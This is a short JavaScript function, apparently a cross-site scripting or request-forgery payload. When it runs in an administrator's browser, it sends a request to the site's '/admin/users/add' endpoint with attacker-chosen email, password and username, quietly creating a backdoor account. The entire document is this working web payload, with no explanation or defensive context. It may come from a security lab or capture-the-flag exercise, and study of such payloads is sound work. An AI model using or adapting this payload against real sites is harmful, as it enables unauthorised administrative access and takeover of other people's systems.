function addUser() {
	var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = function () {
		if (this.readyState == 4 && this.status == 200) {
			// Typical action to be performed when the document is ready:
			alert(xhttp.responseText)
			window.location = window.location;
		}
	};
	
	var creds = 'email=attacker@fake.com&password=fakepass&name=F4k3r&username=faker'
	xhttp.open("GET", "/admin/users/add?" + creds, true);
	xhttp.send();
}
